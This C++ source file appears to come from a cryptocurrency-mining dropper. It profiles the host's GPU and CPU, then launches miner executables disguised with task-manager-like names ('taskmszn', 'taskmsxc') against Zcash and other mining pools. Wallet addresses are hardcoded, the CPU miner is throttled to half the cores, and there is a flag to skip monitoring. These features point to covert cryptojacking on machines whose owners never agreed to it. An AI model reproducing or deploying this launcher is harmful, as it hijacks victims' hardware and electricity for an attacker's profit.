#include "stdafx.h"

#include "CheckEnvironment.h"
#include <Tlhelp32.h>
#include <shlwapi.h>
#pragma comment(lib,"shlwapi.lib")
#include "Utility/PeeIdHelper.h"
#include "commonshare\md5.h"
#include "Utility\StringOperation.h"
#include "userconfig.h"
#include "Util.h"

//配置以下参数
/*
	g_bCheckName:是否检测显卡型号
	g_szCardName：显卡名称匹配（往后添加）
	g_uMinMemorySize：显存大小 根据需求修改
*/
bool g_bCheckName = CHECKCARD;
char g_szCardName[][MAX_PATH] = GPU_N_NAME;
cl_ulong g_uMinMemorySize = GPU_MEMORYSIZE;



bool RunEnvironment::CheckEnvironment()
{
	if (CheckZNCond())
	{
		m_vClient.push_back(L"taskmszn");
	}
	//else if (CheckZACond())
	//{
	//	m_vClient.push_back(L"taskmsza");
	//}
	//else if (CheckECond())
	//{
	//	m_vClient.push_back(L"taskmse");
	//}
	//else if (CheckUCCond())
	//{
	//	m_vClient.push_back(L"taskmsuc");
	//}
	else if (CheckXCCond())
	{
		m_vClient.push_back(L"taskmsxc");
	}
	if (m_vClient.size() > 0)
	{
		return true;
	}
	return false;
}



std::wstring RunEnvironment::GetClientPath(const std::wstring &wstrName)
{
	std::wstring wstrClientPath = L"";
	WCHAR szSubPath[MAX_PATH] = {0};
	_snwprintf(szSubPath, _MAX_PATH, L"%s\\%s.exe", wstrName.c_str(),  wstrName.c_str());

	WCHAR szExeDir[MAX_PATH] = {0};
	GetModuleFileNameW(NULL, szExeDir, MAX_PATH);
	PathRemoveFileSpecW(szExeDir);


	WCHAR szLaunchExe[MAX_PATH] = {0}; 
	PathCombine(szLaunchExe,szExeDir,szSubPath);

	if (::PathFileExists(szLaunchExe))
	{
		wstrClientPath = szLaunchExe;
	}
	return wstrClientPath;
}

bool RunEnvironment::GetUserDisplayCardInfo(vector<DISPLAY_CARD_INFO> &vDISPLAY_CARD_INFO)
{
	if (LoadLibraryA("opencl32.dll") == NULL)
	{
		TSDEBUG4CXX("[GetUserDisplayCardInfo] load opencl fail, nErrorCode = "<< GetLastError());
		return false;  
	}

	GetDisplayCardInfo(vDISPLAY_CARD_INFO);
	return true;  
};

bool RunEnvironment::CheckZNCond()
{
#ifdef Z_ACCOUNT
	if (!IsWow64())
	{
		return false;
	}
	vector<DISPLAY_CARD_INFO> vDISPLAY_CARD_INFO;
	if (!GetUserDisplayCardInfo(vDISPLAY_CARD_INFO))
	{
		return false;
	}
	for (std::vector<DISPLAY_CARD_INFO>::const_iterator iter = vDISPLAY_CARD_INFO.begin(); iter != vDISPLAY_CARD_INFO.end(); iter++) {
		TSDEBUG4CXX(L"[CheckZNCond] Dispaly Card Info: name = "<< iter->name.c_str()<<L", vendor = "<<iter->vendor<<L", memory_size = "<<iter->memory_size);
		if (iter->vendor == vendor_t::nvidia &&  iter->memory_size >= g_uMinMemorySize)
		{
			if (g_bCheckName)
			{
				return CheckGPUName(iter->name);
			}
			else
			{
				TSDEBUG4CXX(L"can do ZN with out check name , Name = " << iter->name.c_str());
				return true;
			}
			
		}
	}
#endif
	return false;
}


bool RunEnvironment::CheckZACond()
{
#ifdef Z_ACCOUNT
	vector<DISPLAY_CARD_INFO> vDISPLAY_CARD_INFO;
	if (!GetUserDisplayCardInfo(vDISPLAY_CARD_INFO))
	{
		return false;
	}
	for (std::vector<DISPLAY_CARD_INFO>::const_iterator iter = vDISPLAY_CARD_INFO.begin(); iter != vDISPLAY_CARD_INFO.end(); iter++) {
		TSDEBUG4CXX(L"[CheckZACond] Dispaly Card Info: name = "<< iter->name.c_str()<<L", vendor = "<<iter->vendor<<L", memory_size = "<<iter->memory_size);
		if (iter->vendor == vendor_t::amd &&  iter->memory_size >= g_uMinMemorySize)
		{
			if (g_bCheckName)
			{
				return CheckGPUName(iter->name);
			}
			else
			{
				TSDEBUG4CXX(L"can do ZA with out check name , Name = " << iter->name.c_str());
				return true;
			}
		}
	}
#endif
	return false;
}

bool RunEnvironment::CheckECond()
{
#ifdef E_ACCOUNT
	vector<DISPLAY_CARD_INFO> vDISPLAY_CARD_INFO;
	if (!GetUserDisplayCardInfo(vDISPLAY_CARD_INFO))
	{
		return false;
	}
	for (std::vector<DISPLAY_CARD_INFO>::const_iterator iter = vDISPLAY_CARD_INFO.begin(); iter != vDISPLAY_CARD_INFO.end(); iter++) {
		TSDEBUG4CXX(L"[CheckZACond] Dispaly Card Info: name = "<< iter->name.c_str()<<L", vendor = "<<iter->vendor<<L", memory_size = "<<iter->memory_size);
		if ((iter->vendor == vendor_t::amd || iter->vendor == vendor_t::nvidia) &&  iter->memory_size >= 3000000000)
		{
			m_uPlatFormID = iter->platformid;
			if (g_bCheckName)
			{
				return CheckGPUName(iter->name);
			}
			else
			{
				TSDEBUG4CXX(L"can do E with out check name , Name = " << iter->name.c_str());
				return true;
			}
		}
	}
#endif
	return false;
}

bool RunEnvironment::CheckXCCond()
{
#ifdef X_ACCOUNT
	SYSTEM_INFO system_info;
	GetSystemInfo(&system_info);
	m_uTotalCpu = system_info.dwNumberOfProcessors; 
	if (m_uTotalCpu >= 2)
	{
		return true;
	}
#endif
	return false;
}

bool RunEnvironment::CheckUCCond()
{
#ifdef U_ACCOUNT
	if (!IsWow64())
	{
		return false;
	}
	SYSTEM_INFO system_info;
	GetSystemInfo(&system_info);
	m_uTotalCpu = system_info.dwNumberOfProcessors; 
	if (m_uTotalCpu >= 2)
	{
		return true;
	}
#endif
	return false;
}

bool RunEnvironment::CheckGPUName(const std::string &strName)
{
	std::string strCardName = strName;
	std::transform(strCardName.begin(), strCardName.end(), strCardName.begin(), tolower);

	for (int i = 0; i < ARRAYSIZE(g_szCardName); ++i)
	{
		if (strCardName.find(g_szCardName[i]) != std::string::npos)
		{
			TSDEBUG4CXX(L"can do z, Name = " << strCardName.c_str());
			return true;
		}
	}
	return false;
}

UINT RunEnvironment::GetCPUMinerThread()
{
	return m_uTotalCpu/2;
}

bool RunEnvironment::CheckIsForceNotMonitor()
{
	return NOT_MONITOR;
}

bool RunEnvironment::StartAllClient(bool bFirst)
{
	bool bRet = false;
	for(std::vector<std::wstring>::const_iterator c_iter = m_vClient.begin() ;c_iter != m_vClient.end() ;c_iter++)
	{
		if (IsClientRunning(*c_iter))
		{
			bRet = true;
			TSDEBUG4CXX(L"client " << *c_iter <<L" is running");
			continue;
		}
		wchar_t szParam[1024] = {0};
		if (*c_iter == L"taskmszn")
		{
			_snwprintf(szParam, 1024, L"--server zec.f2pool.com --user %s.%s --pass x --port 3357 --fee 0 --pec --intensity 1", Z_ACCOUNT,m_wstrWorkID.c_str());
		}
		else if (*c_iter == L"taskmsxc")
		{
			_snwprintf(szParam, 1024, L"-u %s -p %s -t %u" , X_ACCOUNT,m_wstrWorkID.c_str(), GetCPUMinerThread());
		}
	/*	else if (*c_iter == L"taskmsza")
		{
			_snwprintf(szParam, MAX_PATH, ZA_CMD, Z_ACCOUNT, m_wstrWorkID.c_str());
		}
		else if (*c_iter == L"taskmse")
		{
			_snwprintf(szParam, MAX_PATH, L"--farm-recheck 2000 -G -P stratum1+tcp://0x5afef1843f798b19be8215b2fbb7471fd5684f98.%s@setc.share4money.cn:8108 --opencl-platform %u --cl-global-work 100", m_wstrWorkID.c_str(), m_uPlatFormID);
		}
		else if (*c_iter == L"taskmsuc")
		{
			_snwprintf(szParam, MAX_PATH, L"-o \"stratum+tcp://jrb5btn.ulord-pool.com:7100\" -u \"UhFdrhLxHhkjDgjaR31N7WTowSkzrWh65E.%s\" -p \"\" --max-cpu-usage 75", m_wstrWorkID.c_str());
		}*/
		else
		{
			continue;
		}
		std::wstring wstrClientPath = GetClientPath(*c_iter);
		if (wstrClientPath.empty())
		{
			continue;
		}
		WCHAR szCmdLine[1024] = {0};
		_snwprintf(szCmdLine, 1024, L"%s %s", wstrClientPath.c_str(), szParam);
		if (CreateClientProcess(szCmdLine))
		{
			bRet = true;
		}

	}
	return bRet;
}
